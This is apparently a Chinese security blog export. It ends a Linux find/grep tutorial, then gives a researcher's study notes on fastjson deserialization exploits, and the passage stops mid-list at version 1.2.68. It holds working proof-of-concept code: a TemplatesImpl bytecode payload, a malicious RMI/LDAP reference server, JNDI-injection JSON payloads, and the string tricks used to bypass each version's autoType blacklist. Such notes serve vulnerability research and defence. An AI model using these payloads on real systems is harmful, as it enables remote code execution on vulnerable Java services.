<p>　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</p>
<p>　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件</p>
<h5 id="3-使用混合查找方式查找文件"><a href="#3-使用混合查找方式查找文件" class="headerlink" title="3.使用混合查找方式查找文件"></a>3.使用混合查找方式查找文件</h5><p>　　　　参数有： ！，-and(-a)，-or(-o)。</p>
<p>　　 (1)find /tmp -size +10000c -and -mtime +2    #在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</p>
<p>  　   (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件</p>
<p>  　   (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件</p>
<h3 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h3><p>　　　  基本格式：find  expression</p>
<h5 id="1-主要参数"><a href="#1-主要参数" class="headerlink" title="1.主要参数"></a>1.主要参数</h5><p>　　　　[options]主要参数：</p>
<p>　　　　－c：只输出匹配行的计数。</p>
<p>　　　　－i：不区分大小写</p>
<p>　　　　－h：查询多文件时不显示文件名。</p>
<p>　　　　－l：查询多文件时只输出包含匹配字符的文件名。</p>
<p>　　　　－n：显示匹配行及行号。</p>
<p>　　　　－s：不显示不存在或无匹配文本的错误信息。</p>
<p>　　　　－v：显示不包含匹配文本的所有行。</p>
<p>　　　　pattern正则表达式主要参数：</p>
<p>　　　　\： 忽略正则表达式中特殊字符的原有含义。</p>
<p>　　　　^：匹配正则表达式的开始行。</p>
<p>　　　　$: 匹配正则表达式的结束行。</p>
<p>　　　　&lt;：从匹配正则表达 式的行开始。</p>
<p>　　　　&gt;：到匹配正则表达式的行结束。</p>
<p>　　　　[ ]：单个字符，如[A]即A符合要求 。</p>
<p>　　　　[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。</p>
<p>　　　　.：所有的单个字符。</p>
<p>　　　　* ：有字符，长度可以为0。</p>
<h5 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h5><p>　　(1)grep ‘test’ d*　　#显示所有以d开头的文件中包含 test的行</p>
<p>　　(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行</p>
<p>　　(3)grep ‘[a-z]{5}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行</p>
<p>　　(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行</p>
<p>　　(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行</p>
<p>　　(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>bash</tag>
        <tag>find</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson反序列化漏洞学习记录</title>
    <url>/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Fastjson是阿里开发的一个Java库, 提供了将 Java 对象转换为其 JSON 格式、 JSON 字符串转换为等效类<span id="more"></span></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，Fastjson自定义的反序列化机制会调用指定类中的setter方法及部分getter方法，当组件开启了autotype功能并且反序列化不可信数据时（后边即使不开也没用，除非启用safemode），攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有gadget，则会造成一些严重的安全问题。</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">POC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">POC</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set调用&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"><span class="comment">//1.2.22 - 1.2.24</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        POC poc = <span class="keyword">new</span> POC(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        String s = JSON.toJSONString(poc);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.POC\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220606212042046.png" alt="image-20220606212042046"></p>
<p>可以看到,序列化的时候调用了get,反序列化的时候调用了无参构造方法,set和get方法</p>
<h2 id="漏洞历史分析"><a href="#漏洞历史分析" class="headerlink" title="漏洞历史分析"></a>漏洞历史分析</h2><h2 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22 - 1.2.24"></a>1.2.22 - 1.2.24</h2><p>跟着源码调试了一下,大体流程就是对字符串做语法分析,拆分开,并且对每个属性用fieldInfo进行存储,最后使用反射调用它对应的set方法,这个set方法名是字符串拼接的,不难让人想到TemplatesImpl这个类,这个类有一个<code>getOutputProperties()</code>方法</p>
<p>但是有个问题就是这个类中的所有属性都是私有属性,需要添加<code>Feature.SupportNonPublicField</code>字段才能通过<code>JSON.parseObject</code>进行字符串到对象的转换过程</p>
<h4 id="TemplatesImpl调用链"><a href="#TemplatesImpl调用链" class="headerlink" title="TemplatesImpl调用链"></a>TemplatesImpl调用链</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">   TemplatesImpl.newTransformer()</span><br><span class="line">      TemplatesImpl.getTransletInstance()</span><br><span class="line">         TemplatesImpl.defineTransletClasses()</span><br><span class="line">            ClassLoader.defineClass()</span><br><span class="line">               Class.newInstance()</span><br></pre></td></tr></table></figure>

<p>最主要的地方就是构造TemplatesImpl类中的<code>_bytecode</code>属性</p>
<p>这个地方可以使用反射构造继承了<code>AbstractTranslet</code>的恶意类来执行代码</p>
<p>恶意代码可以添加在恶意类的静态代码块在类加载的时候执行或者添加到它的构造方法中在实例化的时候调用</p>
<p>学习一下使用<code>javassist</code>这个工具来生成一个类并修改代码生成字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastJson</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;  </span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass evil = pool.get(evil.class.getName());</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        evil.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        evil.setName(randomClassName);</span><br><span class="line">        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = evil.toBytecode();</span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        <span class="keyword">final</span> String Template = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + Template + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="为什么类需要是public的"><a href="#为什么类需要是public的" class="headerlink" title="为什么类需要是public的"></a>为什么类需要是public的</h5><p>值得一提的是这里的恶意类必须是public的,否则在<code>TemplatesImpl</code>类中的<code>getTransletInstance</code>方法中会无法获取该类的实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607213128139.png" alt="image-20220607213128139"></p>
<p>根本原因在<code>Class.newInstance</code>的调用链这里</p>
<p>按理说我定义的类的包和它就是一致的呀,明明代码都写在一个包下面,但是根据调试发现,javassist生成的class它是不带包名的</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607221426566.png" alt="image-20220607221426566"></p>
<p>所以这个判断的地方输出false,而只有它的修饰符是public才能进入下面的代码并且返回true最后实现实例化</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607220335886.png" alt="image-20220607220335886"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607220315641.png" alt="image-20220607220315641"></p>
<p>这里对于利用条件是有要求的，Fastjson默认只会反序列化public属性，而outputProperties和_bytecodes由private修饰，所以受害端的parseObject必须设置Feature.portNonPublicField，而Feature.portNonPublicField在1.22才被引入，所以这条利用链条件过于苛刻</p>
<h4 id="JdbcRowSetImpl调用链"><a href="#JdbcRowSetImpl调用链" class="headerlink" title="JdbcRowSetImpl调用链"></a>JdbcRowSetImpl调用链</h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220608005810266.png" alt="image-20220608005810266"></p>
<p>在<code>JdbcRowSetImpl#connect</code>方法中调用了参数名可控的<code>InitialContext.lookup()</code>方法</p>
<p>这里有一个基础知识点,就是子类虽然可以继承父类的private属性,但是<strong>必须通过父类中定义的get和set才能访问到</strong></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220608005043003.png" alt="image-20220608005043003"></p>
<p>共有三处调用了<code>connect()</code>方法</p>
<p>里面第三个<code>setAutoCommit</code>方法对应的参数<code>autoCommit</code>同时拥有get方法,可以使用fastjson还原类的时候调用set方法的特性从而调用到<code>lookup</code></p>
<p>编写恶意服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//第一个参数随便填</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;http://127.0.0.1:5555/&quot;</span>);</span><br><span class="line">        <span class="comment">//这里末尾要加个/,否则无法读取.....</span></span><br><span class="line">        <span class="comment">//将该reference封装成远程对象</span></span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开启http服务并将静态代码块有恶意代码的恶意类放上去</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220608011811781.png" alt="image-20220608011811781" style="zoom:67%;" />

<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>



<h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><p>1.2.25开始引入了 checkAutoType 安全机制，默认关闭的情况下不能反序列化类，开启后对反序列化类进行黑名单检测，所以1.2.25~1.2.24的关键就在于<strong>针对开启了Autotype的Fastjson进行黑名单绕过</strong></p>
<p>黑名单的实现在<code>com.alibaba.fastjson.parser.ParserConfig</code>的<code>denyList</code>属性中</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607234636647.png" alt="image-20220607234636647"></p>
<h5 id="checkAutoType函数分析"><a href="#checkAutoType函数分析" class="headerlink" title="checkAutoType函数分析"></a>checkAutoType函数分析</h5><p>如果能直接添加到白名单中也就不需要下面的绕过了</p>
<p>首先需要打开autoType才能进行对不在白名单中的类型进行转换</p>
<p>其中一种方便调试的最简单的方式是设置全局<code>ParserConfig</code>的<code>AutoTypeSupport</code>为true</p>
<p>开启之后让autoTypeSupport为true才能有机会进去这段代码</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220609204549908.png" alt="image-20220609204549908"></p>
<p>在这段代码中判断,如果在白名单<code>acceptList</code>中则调用<code>TypeUtils.loadClass</code>,不在白名单里面进入下面是否在黑名单中的判断,如果不在黑名单才能接着往下走</p>
<p>直到源码的861行,调用<code>TypeUtils.loadClass</code>去加载类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610152821158.png" alt="image-20220610152821158"></p>
<p>这个loadClass方法会将以L开头和;结尾的类名去除L和;再去递归调用加载</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610152802367.png" alt="image-20220610152802367"></p>
<p>这里涉及到一个叫做JNI字段描述符的东西</p>
<p>JNI全称是(Java Native Interface)</p>
<p><a href="https://blog.csdn.net/m0_37537867/article/details/124137225">https://blog.csdn.net/m0_37537867/article/details/124137225</a></p>
<p>它提供一种Java字节码调用c/c++的解决方案</p>
<p>由于Java支持函数重载，因此仅仅根据函数名是没法找到对应的JNI函数。为了解决这个问题，JNI将参数类型和返回值类型作为函数的签名信息。</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610162925861.png" alt="image-20220610162925861"></p>
<p><strong>JNI常用的数据类型及对应字符</strong></p>
<table>
<thead>
<tr>
<th>Java 类型</th>
<th>符号</th>
</tr>
</thead>
<tbody><tr>
<td>Boolean</td>
<td>Z</td>
</tr>
<tr>
<td>Byte</td>
<td>B</td>
</tr>
<tr>
<td>Char</td>
<td>C</td>
</tr>
<tr>
<td>Short</td>
<td>S</td>
</tr>
<tr>
<td>Int</td>
<td>I</td>
</tr>
<tr>
<td>Long</td>
<td>J</td>
</tr>
<tr>
<td>Float</td>
<td>F</td>
</tr>
<tr>
<td>Double</td>
<td>D</td>
</tr>
<tr>
<td>Void</td>
<td>V</td>
</tr>
<tr>
<td>objects对象</td>
<td>以”<code>L</code>“开头，以”<code>;</code>“结尾，中间是用”<code>/</code>“ 隔开的包及类名。比如：<code>Ljava/lang/String;</code>如果是嵌套类，则用<code>$</code>来表示嵌套。例如 “<code>(Ljava/lang/String;Landroid/os/FileUtils$FileStatus;)Z</code>”</td>
</tr>
</tbody></table>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>综合以上条件,需要开启autoTypeSupport并且将类名进行简单改造,给类名添加<code>L</code>和<code>;</code>包裹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="lt-1-2-42"><a href="#lt-1-2-42" class="headerlink" title="&lt;=1.2.42"></a>&lt;=1.2.42</h2><p>1.2.42版本将黑名单进行了hash处理</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610190544304.png" alt="image-20220610190544304" style="zoom:80%;" />

<p>在checkAutoType函数中</p>
<p>先进行一次判断并截取掉了L和;</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610223234128.png" alt="image-20220610223234128"></p>
<p>接下来的代码就是之前检查黑白名单的hash版</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610223337297.png" alt="image-20220610223337297"></p>
<p>到loadClass这里还是递归调用</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610223441375.png" alt="image-20220610223441375"></p>
<p>综上所述,可以使用双写L和;的方式绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="lt-1-2-43"><a href="#lt-1-2-43" class="headerlink" title="&lt;=1.2.43"></a>&lt;=1.2.43</h2><p>该版本对于双写LL的poc进行了判断和限制</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610231237572.png" alt="image-20220610231237572"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parseObject(&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;<span class="string">&quot;);</span></span><br></pre></td></tr></table></figure>

<p>但是可以通过添加<code>[</code>和<code>[&#123;</code>的方式来进行绕过,添加<code>[</code>可以理解,但是添加<code>[&#123;</code>还不甚了解</p>
<p>原因是为了让这个地方的token=14从而绕过数组转换抛出异常</p>
<p>关于fastjson中token的解析<a href="https://blog.csdn.net/qq_45854465/article/details/120626835">https://blog.csdn.net/qq_45854465/article/details/120626835</a></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611160647239.png" alt="image-20220611160647239"></p>
<h2 id="lt-1-2-45"><a href="#lt-1-2-45" class="headerlink" title="&lt;=1.2.45"></a>&lt;=1.2.45</h2><p>出现了新的利用类直接绕过了黑名单限制<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
<blockquote>
<p>但是mybatis版本必须小于3.5.6</p>
</blockquote>
<p>该类中的<code>setProperties()</code>方法存在Jndi注入的问题</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611174720213.png" alt="image-20220611174720213"></p>
<p>新建一个LDAP服务,并且将远程对象引用绑定上去</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611170739137.png" alt="image-20220611170739137"></p>
<p>写段代码测试一下</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611174751726.png" alt="image-20220611174751726"></p>
<p>利用fastjson构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;&#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="lt-1-2-47-—-无需AutoTypeSupport"><a href="#lt-1-2-47-—-无需AutoTypeSupport" class="headerlink" title="&lt;=1.2.47   —(无需AutoTypeSupport)"></a><strong>&lt;=1.2.47</strong>   —(无需AutoTypeSupport)</h2><p>这个版本之前的漏洞都必须要在开启 AutoTypeSupport 的情况下才能利用。由于fastjson会将一些基本类型的类对象提前放到mappings中缓存，通过类缓存机制可以绕过黑白名单检测该版本中，通过利用类缓存机制（通过java.lang.Class类提前带入恶意类并缓存到 TypeUtils.mappings 中），可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。（漏洞点在 checkAutoType 中）</p>
<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(<span class="string">&quot;[&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>java.lang.Class<span class="string">&quot;,&quot;</span>val<span class="string">&quot;:&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="string">&quot;&#125;,&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="string">&quot;,&quot;</span>dataSourceName<span class="string">&quot;:&quot;</span>ldap:<span class="comment">//localhost:10389/cn=test,dc=example,dc=com&quot;,&quot;autoCommit&quot;:true&#125;]&quot;);</span></span><br></pre></td></tr></table></figure>

<p>默认使用的是<code>DefaultJSONParser.parser</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614181358097.png" alt="image-20220614181358097"></p>
<p>使用lexer这个词法分析器检测到<code>@type</code>之后,会调用<code>checkAutoType</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614181943820.png" alt="image-20220614181943820"></p>
<p>主要的点还是在<code>checkAutoType</code>中</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614185549671.png" alt="image-20220614185549671"></p>
<p>经过前面对poc的基础判断之后,会进入<code>deserializers.findClass</code>,这里实际上是去一个桶里面找有没有对应的类,如果类名equal则返回这个类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614183113141.png" alt="image-20220614183113141"></p>
<p>桶里面存了一堆类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614185937978.png" alt="image-20220614185937978"></p>
<p>获取到java.long.Class类之后会返回到</p>
<p>DefaultJSONParser中继续执行</p>
<p>获取到<code>MiscCodec</code>这个类之后,调用<code>deserialize</code>方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614190503311.png" alt="image-20220614190503311"></p>
<p>在这个方法中,获取到了val对应的值<code>com.sun.rowset.JdbcRowSetImpl</code></p>
<p>并且在这个if中进行了类加载</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614191433526.png" alt="image-20220614191433526"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614192231949.png" alt="image-20220614192231949"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614192924962.png" alt="image-20220614192924962"></p>
<p>这里的第三个参数<code>cache</code>为<code>true</code>很重要,这样加载完的类就会存储到之前的<code>mapping</code>中,此时<code>com.sun.rowset.JdbcRowSetImpl</code>就存储在了<code>getClassFromMapping</code>这个方法对应的<code>mapping</code>中</p>
<p>接下来继续解析字符串,检测到左侧大括号,调用<code>paseObject</code>,实际上还是调用的<code>DefaultJSONParser#parseObject</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614193252144.png" alt="image-20220614193252144"></p>
<p>继续到<code>checkAutoType</code>的时候,就可以直接从这里获取到<code>com.sun.rowset.JdbcRowSetImpl</code>类了</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614193532234.png" alt="image-20220614193532234"></p>
<p>走的这个if还不需要开启<code>AutoType</code>从而绕过了checkAutoType</p>
<h2 id="lt-1-2-68"><a href="#lt-1-2-68" class="headerlink" title="&lt;=1.2.68"></a>&lt;=1.2.68</h2><p><a href="https://blog.csdn.net/mole_exp/article/details/122315526">参考</a></p>
<p>但是该漏洞再次实现了在autoType关闭的情况下绕过了<code>ParserConfig#checkAutoType()</code>的安全检测。但具体的漏洞利用的危害程度要取决于目标服务的环境（这一点后面会说到），换言之，漏洞利用并不能做到非常通用，因此漏洞的严重性要稍逊于<code>&lt;= 1.2.47</code> 版本的那个漏洞。</p>
<p>通过<code>public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features)</code>的代码可知，<strong>如果同时符合以下条件，则可以在autoType关闭的情况下，绕过<code>ParserConfig#checkAutoType()</code>的安全校验，从而反序列化指定类</strong>：</p>
<ul>
<li>(1) <code>expectClass</code>不为<code>null</code>，且不等于<code>Object.class</code>、<code>Serializable.class</code>、<code>Cloneable.class</code>、<code>Closeable.class</code>、<code>EventListener.class</code>、<code>Iterable.class</code>、<code>Collection.class</code>;</li>
<li>(2) <code>expectClass</code>需要在缓存集合<code>TypeUtils#mappings</code>中；</li>
<li>(3) <code>expectClass</code>和<code>typeName</code>都不在黑名单中；</li>
